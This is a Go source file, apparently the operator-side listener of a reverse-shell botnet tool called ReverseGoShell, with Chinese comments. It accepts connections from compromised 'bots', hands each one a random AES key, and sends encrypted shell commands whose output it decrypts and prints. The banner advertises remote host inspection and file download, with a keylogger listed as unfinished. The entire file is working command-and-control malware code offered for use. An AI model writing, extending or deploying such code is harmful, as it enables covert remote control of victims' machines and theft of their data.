package main

import (
	"bufio"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"io"
	"math/big"
	"net"
	"os"
	"strings"
)

type Client struct {
	conn net.Conn
	name string
	addr string
}

var (
	//客户端信息,以botName为键
	clientsMap = make(map[string]Client)
)

//TODO:错误提示
func SHandleError(err error, why string) {
	if err != nil {
		fmt.Println(why, err)
	}
}

//TODO:动态密钥生成
func genKeyStr(len int) string {

	//返回指定长度的随机字符串
	var keyStr string
	var str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
	b := bytes.NewBufferString(str)
	length := b.Len()
	bigInt := big.NewInt(int64(length))
	for i := 0; i < len; i++ {
		randomInt, _ := rand.Int(rand.Reader, bigInt)
		keyStr += string(str[randomInt.Int64()])
	}
	return keyStr
}

//TODO:加密函数
func encryptCat(encrypt bool, key []byte, message string) (result string) {

	/*
		加密函数是直接copy来的。
		encypt为true加密，false解密
		key是动态密钥
		message是内容
	*/
	if encrypt {
		plainText := []byte(message)
		block, err := aes.NewCipher(key)
		if err != nil {
			fmt.Println(err)
		}

		cipherText := make([]byte, aes.BlockSize+len(plainText))
		iv := cipherText[:aes.BlockSize]
		if _, err = io.ReadFull(rand.Reader, iv); err != nil {
			fmt.Println(err)
		}

		stream := cipher.NewCFBEncrypter(block, iv)
		stream.XORKeyStream(cipherText[aes.BlockSize:], plainText)
		result = base64.URLEncoding.EncodeToString(cipherText)
	} else {
		cipherText, err := base64.URLEncoding.DecodeString(message)
		if err != nil {
			fmt.Println(err)
		}

		block, err := aes.NewCipher(key)
		if err != nil {
			fmt.Println(err)
		}

		iv := cipherText[:aes.BlockSize]
		cipherText = cipherText[aes.BlockSize:]
		stream := cipher.NewCFBDecrypter(block, iv)
		stream.XORKeyStream(cipherText, cipherText)
		result = string(cipherText)
	}

	return
}

//TODO:Shell相关操作
func shell(client Client, botName string) {

	//生成并发送动态密钥
	keyStr := genKeyStr(16)
	client.conn.Write([]byte(keyStr))

	//进入shell执行流程
	for {
		//将生成的密钥转换byte类型，供后面的加密函数使用
		key := []byte(keyStr)

		//交互shell提示
		reader := bufio.NewReader(os.Stdin)
		fmt.Print("Shell@" + botName + ">")
		command, _ := reader.ReadString('\n')

		//先判断是否要退出(为了切换bot)
		if strings.Compare(string(command), "y\n") == 0 {
			break
		} else {
			//加密输入的字符串
			enc_command := encryptCat(true, key, command)

			if strings.Index(command, "stop") == 0 {
				//判断输入的字符串是否包含stop(停止bot)
				client.conn.Write([]byte(enc_command))
				client.conn.Close()

			} else if strings.Index(command, "cd") == 0 {
				//判断输入的字符串是否包含cd(切换工作目录)
				client.conn.Write([]byte(enc_command))

			} else {
				//不知就就直接发送输入的字符串
				client.conn.Write([]byte(enc_command))
				enc_output, _ := bufio.NewReader(client.conn).ReadString('\n')
				dec_output := encryptCat(false, key, string(enc_output))
				fmt.Println(string(dec_output))
			}
		}
	}
	fmt.Println("Press enter to continue\n")
}

//TODO:入口
func main() {

	bannar := `
 _____                               _____       _____ _          _ _ 
|  __ \     Code By: CoolCat       / ____|     / ____| |        | | |
| |__) |_____   _____ _ __ ___  ___| |  __  ___| (___ | |__   ___| | |
|  _  // _ \ \ / / _ \ '__/ __|/ _ \ | |_ |/ _ \\___ \| '_ \ / _ \ | |
| | \ \  __/\ V /  __/ |  \__ \  __/ |__| | (_) |___) | | | |  __/ | |
|_|  \_\___| \_/ \___|_|  |___/\___|\_____|\___/_____/|_| |_|\___|_|_| 
 - | Modules    | - Function.
 - | checkav    | - Show Remote-Host Info.
 - | Download   | - Download File from Remote-Host to Local-Host.
 - | Keyloger   | - Unfinished.
 - | Screenshot | - Unfinished.
feedback bugs:https://github.com/TheKingOfDuck/ReverseGoShell/issues 
`

	fmt.Println(bannar)

	var (
		port = ":55555"
	)

	if len(os.Args) > 1 {
		port = ":" + string(os.Args[1])
	}

	//TODO:建立服务端监听
	listener, err := net.Listen("tcp", port)

	if err != nil {
		fmt.Println("[!]Listen error: ", err)
		return
	} else {
		fmt.Println("[+]Listening Port" + port)
	}

	fmt.Println("[?]Waiting for online bots....")

	for {
		//TODO:循环接入所有机器
		conn, e := listener.Accept()
		SHandleError(e, "listener.Accept")
		clientAddr := conn.RemoteAddr()

		//TODO:接收并保存肉鸡名称
		buffer := make([]byte, 1024)
		var clientName string
		for {
			n, err := conn.Read(buffer)
			SHandleError(err, "conn.Read(buffer)")
			if n > 0 {
				clientName = "bot@" + string(buffer[:n])
				break
			}
		}

		//TODO:将bot存入map
		client := Client{conn, clientName, clientAddr.String()}
		clientsMap[clientName] = client

		/*
			TODO:控制在线主机
			使用协程来处理各个子SHELL，一堆坑。。。
		*/

		var n = 0
		var m = len(clientsMap)
		for _, client := range clientsMap {
			n++
			if len(clientsMap) == 1 {
				fmt.Println(clientName, clientAddr, "Online")
				var botName = ""
				botName = strings.Split(string(clientName), "@")[1]
				go shell(client, botName)
			} else if len(clientsMap) > 1 {
				if n == 1 {
					fmt.Println("\n"+clientName, clientAddr, "Online")
					reader := bufio.NewReader(os.Stdin)
					fmt.Print("Switch2?[y/n]>")
					//待处理BUG：需要输入两次才能切换
					command, _ := reader.ReadString('\n')
					if strings.Contains(string(command), "\n") {
						var botName = ""
						botName = strings.Split(string(clientName), "@")[1]
						var num = 0
						for _, clientM := range clientsMap {
							num++
							if num == m {
								go shell(clientM, botName)
							}
						}

					} else {
						var botName = ""
						botName = strings.Split(string(clientName), "@")[1]
						go shell(client, botName)
					}
				}
			}
		}
	}
}
